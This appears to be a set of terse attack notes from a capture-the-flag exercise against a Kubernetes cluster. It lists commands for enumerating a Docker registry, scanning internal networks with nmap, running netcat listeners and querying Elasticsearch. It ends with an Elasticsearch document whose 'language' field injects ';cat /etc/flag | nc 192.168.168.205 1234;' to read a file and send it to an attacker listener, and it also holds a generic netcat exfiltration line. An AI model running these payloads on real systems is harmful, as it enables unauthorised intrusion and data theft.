# docker registry
```bash
curl -X GET registry.docker-registry.svc.cluster.local:5000/v2/
curl -X GET registry.docker-registry.svc.cluster.local:5000/v2/_catalog
curl -X GET registry.docker-registry.svc.cluster.local:5000/v2/repl/datascience/tags/list
curl -X GET registry.docker-registry.svc.cluster.local:5000/v2/repl/datascience/manifests/prod
curl -X GET registry.docker-registry.svc.cluster.local:5000/v2/repl/datascience/blobs/sha256:014fa7f955d14ec882ac5643f009e2a1dd3b84cdf8558aa5123cd5989c5a0bcb > datascience_blob
```

# netstat
```shell
netstat -ntlp

nmap 192.168.0.0/16 \
-p T:80,443 \
--open \
-oG - \
| grep "Port" \
| sed -Ee "s/(Host:|Ports:|\(\)|\/|open|https|http|tcp)//g" \
| tee scan_ip_port.txt
```

# nmap
```bash
nmap -sL 192.168.168.190-210
nmap -sL 192.168.0.0/16 | grep datascience
```

# nc
```bash
cat $file | nc $ip $post
nc -v -l -p $port
```

# elasticsearch
```bash
curl 192-168-221-132.elasticsearch-cluster.elasticsearch.svc.cluster.local:9200/_cat/indices?v
curl http://elasticsearch-loadbalancer.elasticsearch.svc.cluster.local/repl-usage/_search

curl \
-X POST "http://elasticsearch-loadbalancer.elasticsearch.svc.cluster.local/repl-usage/usage/_create" \
-H 'Content-Type: application/json' \
-d@document.json

# cat document.json
{
    "language": ";cat /etc/flag | nc 192.168.168.205 1234;",
    "name": "name",
    "text": "text",
    "timestamp": "2019-04-16T13:52:43"
}

curl \
-X POST "http://elasticsearch-loadbalancer.elasticsearch.svc.cluster.local/repl-usage/usage/_create" \
-H 'Content-Type: application/json' \
-d'
{
    "language": ";cat /etc/flag | nc 192.168.168.205 1234;",
    "name": "name",
    "text": "text",
    "timestamp": "2019-04-16T13:59:00"
}
'
```
